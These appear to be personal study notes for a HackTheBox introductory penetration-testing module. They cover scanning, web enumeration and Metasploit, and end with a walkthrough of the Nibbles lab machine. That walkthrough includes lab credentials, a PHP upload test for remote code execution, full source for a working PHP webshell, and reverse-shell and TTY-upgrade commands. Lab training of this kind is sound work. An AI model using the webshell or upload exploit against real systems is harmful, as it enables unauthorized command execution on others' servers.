# Getting Started

## Pentest Distro

Use any distro you like, I personally use kali or parrot os (if its on pwnbox).

## Staying Organized

While attacking a machine, we should be sure to setup a good filder structure to organize our findings. Sample folder Structure:

```
Projects/
└── Acme Company
    ├── EPT
    │   ├── evidence
    │   │   ├── credentials
    │   │   ├── data
    │   │   └── screenshots
    │   ├── logs
    │   ├── scans
    │   ├── scope
    │   └── tools
    └── IPT
        ├── evidence
        │   ├── credentials
        │   ├── data
        │   └── screenshots
        ├── logs
        ├── scans
        ├── scope
        └── tools
```

## Common Terms

- Shell: A shell is a program that takes user input and passes it to the operating system to perform a specific function.
- Port: A port is an access point on a system (denoted by a number) that runs a service. For example Port 80 runs http, 22 runs SSH etc. Ports can usually run TCP or UDP services so it's important to check both.
- Web Server: An application that runs on a back-end server. A web server can be affected by many types of vulnerabilities. The **OWASP Top 10** is one such list of the top 10 vulnerabilities affecting webapps.

## Basic tools

- SSH: Runs on port 22 and used to grant remote access to a system. It can either be configured to authenticate with a password or do public key authentication. Connect to SSH using something like `OpenSSH`. It is possible to read local private keys or add our public key to gain SSH access as a specific user.
- Netcat: Used to interact with any TCP service.
- Tmux: Terminal Multiplexer. Used to do create a split-screen on a terminal so that we can run multiple commands simultaneously.
- Vim: A modal text-editor used to edit files quickly and easily. It also relies entirely on the keyboard so no mouse is necessary.

### Question

Grab the banner of the above server (spawn the instance)

Ans: Use netcat to interact with the server, it will send you the banner. The answer was `SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.1`.


## Service Scanning

### Nmap

- Basic nmap scan: `nmap <host>`, it runs a TCP scan by default. This scan completes very quickly as it scans only the first 1000 ports by default.
    - Use `-sC` to use nmap scripts and `-sV` to perform a version scan. 
    - `-p-` enables a scan of all 65535 ports. Using these flags together takes a lot of time.
    - The script scan can cause nmap to report website headers on the scan results.
    - **Banner Grabbing using nmap**: We can use `nmap -sV --script=banner <tgt>` to get the service banner of the target. This is what we did when we used netcat to get the service banner in the previous exercise.
- **FTP**: FTP is a standard protocol and is usually hosted on port 21. Nmap scans can enumerate this, and if scripts are enabled, it can enumerate various aspects of the FTP server such as anonymous login and FTP directories.
- **SMB**: This is usually found on Windows machines. Sensitive data like Network file shares can be found in these. We can use the `smb-os-discovery.nse` script to get the OS version. Linux can also run smb, commonly using  **samba smbd**.
- SNMP: SNMP Community strings provide information and statistics about a router or device.
    - The manufacturer default Community strings of `public` and `private` are usually unchanged. In versions *1* and *2c*, access is controlled by a plaintext community string, discovery of which, gives us access to it.
    - Tools like `onesixtyone` can be used to bruteforce snmp.

### Exercise

- `masscan <tgt> -e tun0 -p 1-65535,U:1-65535`
- `sudo nmap -sC -sV -A <tgt> -p <open ports> -o nmap.txt`
- `ftp -p <tgt>` (anonymous login, download login.txt from pub directory)
- Credentials for bob are not given so I assume we just need to see them and login.
- `smbclient -N -L \\\\<tgt>`
- `smbclient -U bob \\\\<tgt>\\users`, password is *Welcome1*, `cd flag`, `get flag.txt`

Submit all solutions as per the questions.

## Web Enumeration

### Gobuster

- Gobuster can be used to bruteforce directories using the command `gobuster dir -u http://<address>/ -w <wordlist>`. Try using the **dirb common.txt** wordlist or the **seclists** wordlists.
- DNS Bruteforce: Gobuster can also be used to discover subdomains `gobuster dns -d domain.com -w <wordlist>`. This helps us find interesting subdomains for further enumeration.

### Web Enumeration Tips

- Banner Grabbing/ Web Server Headers: cURL can be used to get the web framework, the auth options, and whether the server is missing essential security options or has been misconfigured. 
    - Command: `cURL -IL https://website.com`

- Whatweb: Extract the version of web servers, supporting frameworks, and applications. 
    - Command: `whatweb <ip>`
    - Network enumeration: `whatweb 10.10.10.0/24`

- Certificates: 
    - SSL/TLS are a valuable source of information while using https. Infomation gathered can inclue company name, email addresses etc. These can be used for phishing attacks

- Robots.txt: Used to instruct search engines, which resource can and can't be used for indexing. Obviously, these can contain private pages and stuff.

- Source Code: Examining source code of a webpage (using the view source or inspect option of the browser) can also reveal valuable information, such as developer comments, etc.


### Exercise Solution

- Run gobuster directory bruteforce to find robots.txt
- Go to this page and look into the source code.
- Enter the credentials.


## Public Exploits

Once banner grabbing is done we can check for public exploits in different places.

### Finding public Exploits

- Google Search: Simplest and easiest. All you need to do is search `<something_app_name> exploit` on google and you can find stuff.
- Searchsploit: You can use a tool like `searchsploit` to search for public exploits too. Syntax: `searchsploit <appname>`


### Metasploit Primer

- Metasploit framework is an all-in-one penetration testing framework that contains built in tools to enumerate, exploit and perform post-exploitation procedures on a target.
- To start metasploit we do `msfconsole` on the terminal.
- See the [checklist](checklist.md) for basic commands.
- It is an essential tool but it's important not to rely solely on this.

### Exercise

- Nmap on the specified port reveals a **wordpress 5.6.1** site running on **apache 2.4.41**
- We can see that the site is running **backup 2.7.10** so I checked for options in msfconsole using `search backup 2.7.10`
- Only one option shows up so I did `use 0` or `use scanner/http/wp_simple_backup_file_read`.
- So set the RHOSTS and RPORT accordingly using the `set RHOSTS <ip>` and `set RPORT <port>` command.
- Then when you run the exploit it's vulnerable. It by default reads */etc/passwd* so I changed the FILEPATH option to */flag.txt*.
- On running the exploit I got the flag. To read the flag file saved on the local machine, just use shell commands.


## Types of Shells

| Type of Shell | Method of Communication                                                                                                     |
| ------------- | --------------------------------------------------------------------------------------------------------------------------- |
| Reverse Shell | Connects back to our system and gives us control through a reverse connection.                                              |
| Bind Shell    | Waits for us to connect to it and gives us control once we do.                                                              |
| Web Shell     | Communicates through a web server, accepts our commands through HTTP parameters, executes them, and prints back the output. |


## Privilege Escalation

- Gain full system control (SYSTEM on windows and root on linux)

### Checklists

- Windows: [HackTricks](https://book.hacktricks.wiki/en/linux-hardening/linux-privilege-escalation-checklist.html), [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md).
- Linux: [HackTricks](https://book.hacktricks.wiki/en/linux-hardening/linux-privilege-escalation-checklist.html), [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)

### Enumeration Scripts

- Linux: linpeas, LinEnum, linuxprivchecker
- Windows: winpeas, seatbelt, jaws

### Kernel Exploits

- Usually can be found by the enumeration scripts.
- Searchsploit is also a good way to do this.

### Vulnerable Software

- Check for installed software on linux using `dpkg -l`
- Check for the same on windows in the `C:\Programs` folder

### User Privileges

Common things to check for:
    1. sudo (enumerate using `sudo -l`, execute commands as a specific user using the following `sudo -u user1 <command>`)
    2. suid
    3. Windows Token Privileges

- Check for exploitable binaries on linux using [GTFOBins](https://gtfobins.github.io/)
- For windows use [LOLBAS](https://lolbas-project.github.io/#)

## Nibbles - HTB Machine

### Enumeration

I will use my own enumeration flows here, but I will mention what HTB did where necessary

So we can do the full HTB flow that they did in just 2 steps:
1. `sudo masscan <tgt> -e tun0 -p 1-65535,U:1-65535 --rate=1000`
2. `sudo nmap -p- <tgt>`
2. `sudo nmap -sC -sV -A <tgt> -oA nmap_results -p <comma_separated_open_ports>`

### Web footprinting

- Analyze page source
- Check page using cURL
- whatweb: Use it on endpoints to get the tech stack (`whatweb http://<ip>/nibbleblog/`)
- Search for exploits, here the program is `nibbleblog`. Searching for something like **nibbleblog exploit** on google yields an exploit. In this case, we can upload php files and execute them. We don't know the version, but it is worth trying this. The **metasploit** module for this uses user supplied credentials to exploit it.
- Fuzzing the endpoint using any tool (I personally use dirsearch or ffuf) reveals the existence of an admin.php, 
- In case you need to generate wordlists using a site use **CeWL**.
- On doing some more checking around, you can also find that `/themes` has directory listing enabled. Enumerating here allows us to confirm that **admin** is a valid username.

```
NOTE: This has IP-Based blacklisting enabled, which allows the server to block our IP based on multiple login attempts, so bruteforcing is not an option here.
```

- This part is honestly just guesswork, but essentially when we look at `nibbleblog/content/private/users.xml` we see a lot of mentiones of the word nibbles (not-so-coincidentally, the name of the box). This is what CeWL can be used for as well. You can crawl the site and enable wordlist parsing.

## Nibbles - Initial Foothold

- So, to get the foothold here, I am gonna follow a slightly more convenient approach.
- We already have access to the admin panel because, we figured out the admin credentials, that being `admin:nibbles`.
- We will use this to login to the admin panel. Here we can see a couple of functions that are available. 

| Page | Contents |
| :--- | :--- |
| **Publish** | making a new post, video post, quote post, or new page. It could be interesting. |
| **Comments** | shows no published comments |
| **Manage** | Allows us to manage posts, pages, and categories. We can edit and delete categories, not overly interesting. |
| **Settings** | Scrolling to the bottom confirms that the vulnerable version 4.0.3 is in use. Several settings are available, but none seem valuable to us. |
| **Themes** | This Allows us to install a new theme from a pre-selected list. |
| **Plugins** | Allows us to configure, install, or uninstall plugins. The My image plugin allows us to upload an image file. Could this be abused to upload PHP code potentially? |

- Now it is important to test all the funcions, check it out in burp, and analyze it. In this case, the obvious area to pay careful attention to is `plugins`.
- Here we can see that the plugin can be a piece of PHP code or some sort of image. At first glance, there doesn't seem to be much validation, so we'll try and upload an arbitrary piece of code to test for RCE.

```php
<?php system('id'); ?>
```

- Save this to a file (here, I am calling it test.php) and upload it. cURL this endpoint (`/nibbleblog/content/private/plugins/my_image/<filename>.php`), and you will see the output for id. This shows that we have RCE.
- We have 2 options here, either use Metasploit and get RCE or upload your own webshell. I will show you a simple webshell that I've made which allows you to run commands in the browser. Either use this or another php webshell called p0wny shell (very cool btw).
- This is the code to my webshell:

```php
<?php
if (isset($_POST['cmd'])) {
    $output = shell_exec($_POST['cmd']);
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>Mini WebShell</title>
</head>
<body>
    <h2>PHP WebShell</h2>
    <form method="post">
        <input type="text" name="cmd" placeholder="Enter command" size="50">
        <input type="submit" value="Execute">
    </form>

    <?php if (isset($output)): ?>
        <pre><?php echo htmlspecialchars($output); ?></pre>
    <?php endif; ?>
</body>
</html>
```

- From here you can run any reverse shell payload, and get a proper shell. Start a netcat listener on a port of your choice, and use a tool like [revshells](https://revshells.com) to generate a payload.
- Once the connection is established, use any method to gain a full tty. The 2 best ones that I've seen to work are as follows.

```bash
python3 -c "import pty; pty.spawn('/bin/bash')"

(if python is on the system)
```

or

```bash
script /dev/null -c /bin/bash
```

- Both of these yield full terminals. Check user.txt for the flag.

